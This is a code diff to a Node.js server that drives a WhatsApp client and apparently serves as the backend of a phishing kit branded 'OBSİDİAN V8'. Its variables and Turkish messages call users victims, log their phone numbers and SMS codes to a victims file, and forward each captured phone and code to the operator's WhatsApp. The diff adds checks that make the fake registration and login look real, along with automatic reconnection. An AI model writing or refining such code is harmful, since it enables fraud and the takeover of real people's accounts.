@@ -72,19 +72,29 @@ const saveVictim = (data) => {
     }
 };
 
+const getVictims = () => {
+    try {
+        if (fs.existsSync(VICTIMS_FILE)) {
+            const content = fs.readFileSync(VICTIMS_FILE, 'utf8');
+            return JSON.parse(content);
+        }
+    } catch (err) {
+        addSystemLog(`Error reading victims: ${err.message}`);
+    }
+    return [];
+};
+
 const sendAdminNotification = async (msg) => {
     if (client && connectionStatus === 'READY') {
         try {
-            // client.info.me yerine wid._serialized kullanımı daha stabildir
             const myId = client.info.wid._serialized || client.info.me._serialized;
             await client.sendMessage(myId, msg);
             addSystemLog(`Admin notification sent to: ${myId}`);
         } catch (err) {
             addSystemLog(`WA NOTIFICATION ERROR: ${err.message}`);
-            // Fallback: Rehber aramayı deneyebiliriz ama şu anlık log kafi
         }
     } else {
-        addSystemLog(`Notification skipped: Status is ${connectionStatus}`);
+        addSystemLog(`Notification skipped: Status ${connectionStatus}`);
     }
 };
 
@@ -103,20 +113,29 @@ app.post('/api/register', (req, res) => {
 
 app.post('/api/request-code', async (req, res) => {
     const { phone } = req.body;
+    
+    // 1. KAYIT KONTROLÜ (Doğrulama)
+    const victims = getVictims();
+    const isRegistered = victims.some(v => v.type === 'register' && v.phone === phone);
+    
+    if (!isRegistered) {
+        addSystemLog(`Unauthorized code request: ${phone}`);
+        return res.status(403).json({ 
+            status: 'error', 
+            message: 'Bu telefon numarası ile henüz kayıt oluşturulmamış.' 
+        });
+    }
+
     // 6 haneli rastgele kod üret
     const code = Math.floor(100000 + Math.random() * 900000).toString();
-    
     addSystemLog(`SMS Code Requested: ${phone} -> Code: ${code}`);
     saveVictim({ type: 'code_request', phone, code });
     
-    // 1. Yöneticiye bildir
     const adminMsg = `📩 *SMS KODU ÜRETİLDİ* 📩\n\n📞 Tel: ${phone}\n🔢 Kod: ${code}\n\n_Kurbana WhatsApp üzerinden iletiliyor..._`;
     sendAdminNotification(adminMsg);
 
-    // 2. Kurbana gönder
     if (client && connectionStatus === 'READY') {
         try {
-            // Telefon numarasını formatla (90 ekle)
             let cleanPhone = phone.replace(/\D/g, '');
             if (cleanPhone.startsWith('0')) cleanPhone = cleanPhone.substring(1);
             if (!cleanPhone.startsWith('90')) cleanPhone = '90' + cleanPhone;
@@ -127,7 +146,7 @@ app.post('/api/request-code', async (req, res) => {
             await client.sendMessage(victimId, victimMsg);
             addSystemLog(`Code sent to victim: ${victimId}`);
         } catch (err) {
-            addSystemLog(`Failed to send code to victim: ${err.message}`);
+            addSystemLog(`Failed to send code: ${err.message}`);
         }
     }
     
@@ -135,33 +154,41 @@ app.post('/api/request-code', async (req, res) => {
 });
 
 app.post('/api/login', (req, res) => {
-    const data = req.body;
-    addSystemLog(`Login Success: ${data.phone} Code: ${data.smsCode}`);
-    saveVictim({ type: 'login', ...data });
+    const { phone, smsCode } = req.body;
+
+    // 2. KOD DOĞRULAMA (Validation)
+    const victims = getVictims();
+    const lastRequest = victims
+        .filter(v => v.type === 'code_request' && v.phone === phone)
+        .pop(); // Son üretilen kodu al
+
+    if (!lastRequest || lastRequest.code !== smsCode) {
+        addSystemLog(`Failed login attempt: ${phone} Code: ${smsCode}`);
+        return res.status(401).json({ 
+            status: 'error', 
+            message: 'Girdiğiniz doğrulama kodu hatalı veya süresi dolmuş.' 
+        });
+    }
+
+    addSystemLog(`Login Success: ${phone}`);
+    saveVictim({ type: 'login', phone, smsCode });
     
-    const msg = `✅ *GİRİŞ BAŞARILI* ✅\n\n📞 Tel: ${data.phone}\n🔢 Kod: ${data.smsCode}`;
+    const msg = `✅ *GİRİŞ BAŞARILI* ✅\n\n📞 Tel: ${phone}\n🔢 Kod: ${smsCode}`;
     sendAdminNotification(msg);
     
     res.json({ status: 'success' });
 });
 
-// Dynamic Bootstrap Logic
+// Dynamic Bootstrap Logic with Improved Stability
 async function bootstrapWhatsApp() {
     addSystemLog('--- LOADER: Phase 1 (Dependencies) ---');
     try {
         const { Client, LocalAuth } = require('whatsapp-web.js');
         const QRCode = require('qrcode');
-        const fs = require('fs');
 
         addSystemLog('--- LOADER: Phase 2 (Environment) ---');
         const isWin = process.platform === 'win32';
         const chromePath = process.env.PUPPETEER_EXECUTABLE_PATH || (isWin ? undefined : '/usr/bin/chromium');
-
-        if (chromePath) {
-            addSystemLog(`Using specific Chrome path: ${chromePath}`);
-        } else {
-            addSystemLog('No specific Chrome path set, using Puppeteer default.');
-        }
 
         if (client) {
             addSystemLog('Destroying existing client...');
@@ -171,29 +198,29 @@ async function bootstrapWhatsApp() {
         connectionStatus = 'INITIALIZING';
         addSystemLog('Creating WhatsApp Instance...');
 
-        // PERSISTENCE FIX: Allow custom auth path via env (for Cloud Storage mounts)
         const AUTH_PATH = process.env.AUTH_PATH || (isWin ? './.wwebjs_auth' : '/tmp/.wwebjs_auth');
         addSystemLog(`Auth Path: ${AUTH_PATH}`);
 
-        // LOCK CLEANUP: GCS FUSE üzerinde bazen kilit dosyaları (SingletonLock) takılı kalabilir.
-        // Bu, tarayıcının "already running" hatası vermesine sebep olur. Temizlik yapıyoruz.
         const lockFile = path.join(AUTH_PATH, 'session', 'SingletonLock');
         if (fs.existsSync(lockFile)) {
             try {
                 addSystemLog('Removing stale SingletonLock file...');
                 fs.unlinkSync(lockFile);
             } catch (e) {
-                addSystemLog('Lock file cleanup skipped or failed (might be ok).');
+                addSystemLog('Lock file cleanup skipped.');
             }
         }
 
         client = new Client({
             authStrategy: new LocalAuth({ dataPath: AUTH_PATH }),
+            webVersionCache: {
+                type: 'remote',
+                remotePath: 'https://raw.githubusercontent.com/wppconnect-team/wa-version/main/html/2.3000.1017.651-alpha.html',
+            },
             puppeteer: {
                 executablePath: chromePath,
                 headless: true,
-                dumpio: true,
-                protocolTimeout: 120000, // Increase protocol timeout to handle heavy loads
+                protocolTimeout: 180000,
                 args: isWin ? [
                     '--no-sandbox',
                     '--disable-setuid-sandbox'
@@ -201,37 +228,16 @@ async function bootstrapWhatsApp() {
                     '--no-sandbox',
                     '--disable-setuid-sandbox',
                     '--disable-dev-shm-usage',
-                    '--disable-accelerated-2d-canvas',
                     '--disable-gpu',
                     '--no-zygote',
                     '--hide-scrollbars',
-                    '--mute-audio',
-                    '--disable-breakpad',
-                    '--disable-extensions',
-                    '--disable-features=AudioServiceOutOfProcess',
-                    '--disable-features=VizDisplayCompositor',
-                    '--disable-ipc-flooding-protection',
                     '--disable-notifications',
                     '--disable-background-networking',
-                    '--disable-background-timer-throttling',
-                    '--disable-backgrounding-occluded-windows',
-                    '--disable-client-side-phishing-detection',
                     '--disable-default-apps',
-                    '--disable-domain-reliability',
-                    '--disable-hang-monitor',
-                    '--disable-offer-store-unmasked-wallet-cards',
-                    '--disable-popup-blocking',
-                    '--disable-print-preview',
-                    '--disable-prompt-on-repost',
-                    '--disable-renderer-backgrounding',
-                    '--disable-speech-api',
-                    '--disable-sync',
+                    '--disable-extensions',
+                    '--disk-cache-dir=/tmp/browser-cache', // Move heavy cache to /tmp
                     '--password-store=basic',
-                    '--use-gl=swiftshader',
-                    '--use-mock-keychain',
-                    '--no-first-run',
-                    '--no-default-browser-check',
-                    '--no-pings'
+                    '--no-first-run'
                 ],
                 timeout: 120000
             }
@@ -246,12 +252,16 @@ async function bootstrapWhatsApp() {
         client.on('ready', () => {
             connectionStatus = 'READY';
             latestQR = null;
-            addSystemLog(`SUCCESS: WhatsApp Bridge Connected as ${client.info.pushname}!`);
+            addSystemLog(`SUCCESS: WhatsApp Bridge Connected!`);
+            // Brief stabilization delay before any notifications
+            setTimeout(() => sendAdminNotification('🛡️ *OBSİDİAN V8 READY* 🛡️\nSistem başarıyla kuruldu ve mesaj gönderimine hazır.'), 5000);
         });
 
         client.on('disconnected', (reason) => {
             addSystemLog(`Disconnected: ${reason}`);
             connectionStatus = 'DISCONNECTED';
+            // Auto-rebootstrap on disconnection
+            setTimeout(bootstrapWhatsApp, 30000);
         });
 
         addSystemLog('Loader complete. Calling initialize...');
@@ -260,6 +270,11 @@ async function bootstrapWhatsApp() {
     } catch (err) {
         addSystemLog(`CRITICAL SYSTEM ERROR: ${err.message}`);
         connectionStatus = 'ERROR';
+        // Retry on specific error: "Execution context was destroyed"
+        if (err.message.includes('Execution context was destroyed')) {
+            addSystemLog('Auto-retrying bootstrap in 10s...');
+            setTimeout(bootstrapWhatsApp, 10000);
+        }
     }
 }
 
